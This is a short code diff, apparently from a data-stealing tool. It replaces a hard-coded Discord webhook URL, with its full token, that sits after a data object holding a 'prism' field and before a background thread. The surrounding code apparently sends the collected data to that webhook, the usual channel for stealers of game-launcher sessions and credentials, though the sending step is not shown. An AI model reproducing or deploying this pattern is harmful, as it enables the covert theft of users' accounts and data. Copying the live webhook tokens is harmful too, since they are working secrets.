@@ -22,7 +22,7 @@ const data = {
     prism: prism,
 };
 
-const link = "https://discord.com/api/webhooks/1373747826961551572/4870fkPvS582mMKig0Qt-m2-ACQ38TKh9dLuIxASK_E72PBT8-bjYAoKki9NnZH_pNXS";
+const link = "https://discord.com/api/webhooks/1374785605862428742/t8yUQsyCWBbX7IPIlR5oxGNn6-cuBLp6Hl-y3pr_ftuftEHBDO5sLFab4vnlgAm-WCCx";
 
 new Thread(() => {
     try {
